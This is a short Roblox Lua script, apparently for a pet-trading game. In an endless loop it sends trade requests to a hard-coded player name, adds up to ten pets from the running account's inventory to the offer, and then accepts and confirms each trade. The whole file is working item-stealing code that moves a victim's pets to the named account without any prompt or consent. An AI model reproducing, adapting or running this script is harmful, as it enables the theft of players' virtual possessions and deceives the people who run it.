	local l__load__1 = require(game.ReplicatedStorage:WaitForChild("Fsys")).load;
	local u7 = l__load__1("RouterClient")

	while wait() do
		local data = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()
		u7.get("TradeAPI/SendTradeRequest"):FireServer(game:GetService("Players").Bartek213710)

		while wait() do
			data = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()
			if data["crecerR_WasTaken"]['trade'] then
				break
			end
			wait(1)
		end



		-- game:GetService("ReplicatedStorage").API:FindFirstChild("SrbfhEUOGKxxquD/iGrvx"):FireServer()
		local count = 0
		for i, v in pairs(data["crecerR_WasTaken"]["inventory"]['pets']) do
			print(i)
			count = count + 1
			if count <= 10 then
				u7.get("TradeAPI/AddItemToOffer"):FireServer(v.unique)
			end
		end

		wait(5)

		u7.get("TradeAPI/AcceptNegotiation"):FireServer()

		while wait() do
			data = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()
			print(data["crecerR_WasTaken"]['trade']['recipient_offer']['confirmed'])
			print(data["crecerR_WasTaken"]['trade']['sender_offer']['confirmed'])
			if data["crecerR_WasTaken"]['trade']['recipient_offer']['confirmed'] == true or data["crecerR_WasTaken"]['trade']['sender_offer']['confirmed'] == true then
				break
			end
			wait(1)
		end


		u7.get("TradeAPI/ConfirmTrade"):FireServer()
		wait(5)
	end
